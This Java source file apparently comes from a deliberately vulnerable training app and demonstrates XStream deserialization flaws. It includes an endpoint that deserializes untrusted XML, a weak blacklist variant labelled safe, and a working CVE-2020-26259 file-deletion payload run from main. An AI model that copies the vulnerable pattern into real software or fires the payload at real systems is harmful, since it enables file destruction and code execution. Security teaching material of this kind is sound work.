package top.whgojp.modules.components.xstream.controller;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.security.*;
import io.swagger.annotations.Api;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.imageio.ImageIO;
import java.util.Date;

/**
 * @description 组件漏洞-Xstream
 * @author: whgojp
 * @email: whgojp@foxmail.com
 * @Date: 2024/8/12 22:54
 */
@Slf4j
@Api(value = "XstreamController", tags = "组件漏洞-Xstream")
@Controller
@CrossOrigin(origins = "*")
@RequestMapping("/xstream")
public class XstreamController {
    @RequestMapping("")
    public String xstream() {
        return "vul/components/xstream";
    }

//    @RequestMapping("/vul")
//    @ResponseBody
//    public String vulXstream(@RequestBody String content) {
//        log.info("组件漏洞-Xstream\n"+"Payload:"+content);
//        XStream xs = new XStream();
//        xs.fromXML(content);
//        return "组件漏洞-Xstream Vul";
//    }

    @RequestMapping("/vul")
    @ResponseBody
    public String vul(@RequestBody String content) {
        log.info("组件漏洞-Xstream\n" + "Payload:" + content);
        XStream xs = new XStream();
        Object result = xs.fromXML(content);  // 反序列化得到的对象

        // 检查反序列化后的结果并返回相关信息
        return "组件漏洞-Xstream Vul, 反序列化结果: \n" + result.toString();
    }

    @RequestMapping("/safe1")
    public String safe1(@RequestBody String content) {
        XStream xstream = new XStream();
        // 首先清除默认设置，然后进行自定义设置
        xstream.addPermission(NoTypePermission.NONE);
        // 将ImageIO类加入黑名单
        xstream.denyPermission(new ExplicitTypePermission(new Class[]{ImageIO.class}));
        xstream.fromXML(content);
        return "组件漏洞-Xstream Safe-BlackList";
    }
    @RequestMapping("/safe2")
    public String safe2(@RequestBody String content) {
        XStream xstream = new XStream();
         // 首先清除默认设置，然后进行自定义设置
        xstream.addPermission(NoTypePermission.NONE);
        // 添加一些基础的类型，如Array、NULL、primitive
        xstream.addPermission(ArrayTypePermission.ARRAYS);
        xstream.addPermission(NullPermission.NULL);
        xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
        // 添加自定义的类列表
        xstream.addPermission(new ExplicitTypePermission(new Class[]{Date.class}));
        return "组件漏洞-Xstream Safe-WhiteList";
    }

    // CVE-2020-26259 任意文件删除示例
    public static void main(String[] args) {
        String xml_poc = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>\n" +
                "              <tempFile>/Users/whgojp/Downloads/tmp.txt</tempFile>\n" +
                "            </is>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";
        System.out.println(xml_poc);
        XStream xs = new XStream();

        xs.fromXML(xml_poc);
    }

}
